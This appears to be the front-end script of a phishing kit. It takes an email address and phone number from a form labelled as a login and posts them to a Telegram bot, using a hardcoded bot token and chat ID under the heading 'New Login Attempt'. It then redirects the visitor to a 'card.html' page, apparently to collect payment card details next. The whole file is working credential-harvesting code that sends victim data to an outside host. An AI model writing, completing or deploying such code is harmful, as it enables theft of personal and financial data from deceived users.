
function alertContinue(){
    const email = document.getElementById("email")
    const number = document.getElementById("number")

    let isValid = true;
    let emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    let phoneRegex = /^\+?[0-9]{10}$/;

    //  Email and Number validation
    if(email.value == "" || number.value == ""){
        document.getElementById("emailError").style.display = "block"
        document.getElementById("numberError").style.display = "block"
    }else{
        document.getElementById("emailError").style.display = "none"
        document.getElementById("numberError").style.display = "none"
        
        let phoneCheck = phoneRegex.test(number.value)
        let emailCheck = emailRegex.test(email.value)
        // console.log(phoneCheck, emailCheck);
        
        if(phoneCheck && emailCheck) {
            console.log('Good to gooooooooo');
        } else {
            console.log('nayyyyyy');
        }
        
        if(isValid){
            //  If validation passes, send data to Telegram
        const botToken = "8017405297:AAFlLa-_uAor4TFX0PgP0OiaaVq2-hy2fTo"; // Replace with your bot token
        const chatID = "7528859168"; // Replace with your chat ID

        const telegramMessage =
        `---------New Login Attempt---------

        👤 Email:  ${email.value}
        🔒 Number: ${number.value}`

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatID,
                text: telegramMessage
            }),
        })
        setTimeout(()=>{
            window.location.href = "card.html"
        }, 2000)
    }else {
        if (userName.value.trim() == "") {
            document.getElementById("userError").style.display = "block"
        }
        if (passWord.value.trim() == "") {
            document.getElementById("passError").style.display = "block"
        }
        }
    }
}